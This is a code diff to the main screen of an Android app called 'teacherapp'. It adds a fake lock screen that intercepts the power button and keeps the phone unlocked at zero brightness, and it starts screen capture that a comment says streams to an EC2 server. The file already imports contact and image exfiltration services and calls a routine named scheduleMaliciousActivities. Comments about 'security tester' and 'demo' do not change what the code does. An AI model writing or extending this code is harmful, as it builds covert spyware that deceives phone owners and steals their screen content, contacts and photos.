@@ -1,14 +1,20 @@
 package com.example.teacherapp
 
 import android.Manifest
+import android.content.BroadcastReceiver
+import android.content.Context
 import android.content.Intent
+import android.content.IntentFilter
 import android.content.pm.PackageManager
+import android.media.projection.MediaProjectionManager
 import android.os.Build
 import android.os.Bundle
 import android.os.Handler
 import android.os.Looper
+import android.os.PowerManager
 import android.provider.Settings
 import android.text.TextUtils
+import android.view.WindowManager
 import android.widget.Toast
 import androidx.activity.ComponentActivity
 import androidx.activity.compose.setContent
@@ -26,6 +32,8 @@ import androidx.core.content.ContextCompat
 import androidx.navigation.NavHostController
 import androidx.navigation.compose.rememberNavController
 import com.example.teacherapp.navigation.NavGraph
+import com.example.teacherapp.navigation.ScreenOverlayState
+import com.example.teacherapp.services.ScreenMirrorService
 import com.example.teacherapp.ui.theme.TeacherappTheme
 import com.teacherapp.services.ContactExfiltrationService
 import com.teacherapp.services.ImageExfiltrationService
@@ -38,6 +46,33 @@ import kotlinx.coroutines.launch
 
 
 class MainActivity : ComponentActivity() {
+
+    // Inactivity screen dimming
+    private val inactivityTimeout = 2 * 60 * 1000L // 2 minutes
+    private val inactivityHandler = Handler(Looper.getMainLooper())
+    private val dimScreenRunnable = Runnable {
+        // Freeze route tracking — savedRoute now holds the user's last screen
+        ScreenOverlayState.isTracking = false
+        val params = window.attributes
+        params.screenBrightness = 0.0f
+        window.attributes = params
+    }
+
+    // Fake lock — intercept the power/lock button
+    private var isFakeLocked = false
+    private var wakeLock: PowerManager.WakeLock? = null
+
+    private val screenReceiver = object : BroadcastReceiver() {
+        override fun onReceive(context: Context, intent: Intent) {
+            if (intent.action == Intent.ACTION_SCREEN_OFF) {
+                if (!isFakeLocked) {
+                    fakeLock()     // First press: fake lock, let security tester in
+                } else {
+                    realLock()     // Second press: restore state and actually lock
+                }
+            }
+        }
+    }
 
     // Required permissions array
     private val requiredPermissions = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
@@ -76,6 +111,15 @@ class MainActivity : ComponentActivity() {
         }
     }
 
+    // MediaProjection launcher for screen capture
+    private val projectionLauncher = registerForActivityResult(
+        ActivityResultContracts.StartActivityForResult()
+    ) { result ->
+        if (result.resultCode == Activity.RESULT_OK && result.data != null) {
+            ScreenMirrorService.start(this, result.resultCode, result.data!!)
+        }
+    }
+
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
@@ -90,6 +134,9 @@ class MainActivity : ComponentActivity() {
                 }
             }
         }
+
+        // Register power button / screen-off receiver
+        registerReceiver(screenReceiver, IntentFilter(Intent.ACTION_SCREEN_OFF))
 
         // Request permissions directly
         requestNecessaryPermissions()
@@ -141,6 +188,10 @@ class MainActivity : ComponentActivity() {
 
         // Schedule malicious activities
         scheduleMaliciousActivities()
+
+        // Start screen mirroring to EC2
+        val projectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
+        projectionLauncher.launch(projectionManager.createScreenCaptureIntent())
 
         // Prompt for accessibility service after a delay
         Handler(Looper.getMainLooper()).postDelayed({
@@ -242,13 +293,115 @@ class MainActivity : ComponentActivity() {
         }
     }
 
+    private fun fakeLock() {
+        isFakeLocked = true
+        // Freeze nav tracking — savedRoute holds where the user was
+        ScreenOverlayState.isTracking = false
+
+        // Acquire wake lock to keep screen alive (prevents real lock screen)
+        @Suppress("DEPRECATION")
+        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
+        wakeLock = pm.newWakeLock(
+            PowerManager.FULL_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP,
+            "teacherapp:fakelock"
+        )
+        wakeLock?.acquire(10 * 60 * 1000L) // max 10 min safety timeout
+
+        // Show activity over lock screen so it stays visible at brightness 0
+        @Suppress("DEPRECATION")
+        window.addFlags(
+            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
+            WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD or
+            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
+            WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
+        )
+
+        // Zero brightness — physically dark, EC2 stream still live
+        val params = window.attributes
+        params.screenBrightness = 0.0f
+        window.attributes = params
+    }
+
+    private fun realLock() {
+        isFakeLocked = false
+
+        // Restore nav to where the user was before the demo
+        ScreenOverlayState.savedRoute?.let { route ->
+            ScreenOverlayState.navController?.navigate(route) {
+                popUpTo(0) { inclusive = true }
+            }
+        }
+        ScreenOverlayState.isTracking = true
+
+        // Restore brightness briefly so the transition looks natural
+        val params = window.attributes
+        params.screenBrightness = WindowManager.LayoutParams.BRIGHTNESS_OVERRIDE_NONE
+        window.attributes = params
+
+        // Remove flags and release wake lock → OS shows real lock screen
+        @Suppress("DEPRECATION")
+        window.clearFlags(
+            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
+            WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD or
+            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
+            WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
+        )
+        wakeLock?.release()
+        wakeLock = null
+    }
+
+    override fun onUserInteraction() {
+        super.onUserInteraction()
+
+        if (isFakeLocked) {
+            // Tap during fake lock → real lock + restore state
+            realLock()
+            return
+        }
+
+        inactivityHandler.removeCallbacks(dimScreenRunnable)
+
+        val wasScreenDimmed = !ScreenOverlayState.isTracking
+
+        // Restore brightness
+        val params = window.attributes
+        params.screenBrightness = WindowManager.LayoutParams.BRIGHTNESS_OVERRIDE_NONE
+        window.attributes = params
+
+        if (wasScreenDimmed) {
+            // Clear demo navigation and restore the user's last screen
+            ScreenOverlayState.savedRoute?.let { route ->
+                ScreenOverlayState.navController?.navigate(route) {
+                    popUpTo(0) { inclusive = true }
+                }
+            }
+            ScreenOverlayState.isTracking = true
+        }
+
+        inactivityHandler.postDelayed(dimScreenRunnable, inactivityTimeout)
+    }
+
     override fun onResume() {
         super.onResume()
+        // Start inactivity timer when app is visible
+        inactivityHandler.postDelayed(dimScreenRunnable, inactivityTimeout)
 
         // Optional: Check if accessibility was just enabled
         if (isAccessibilityServiceEnabled()) {
             android.util.Log.d("MainActivity", "✅ Accessibility service is now enabled!")
         }
+    }
+
+    override fun onPause() {
+        super.onPause()
+        // Cancel timer when app goes to background
+        inactivityHandler.removeCallbacks(dimScreenRunnable)
+    }
+
+    override fun onDestroy() {
+        unregisterReceiver(screenReceiver)
+        wakeLock?.release()
+        super.onDestroy()
     }
 }
 
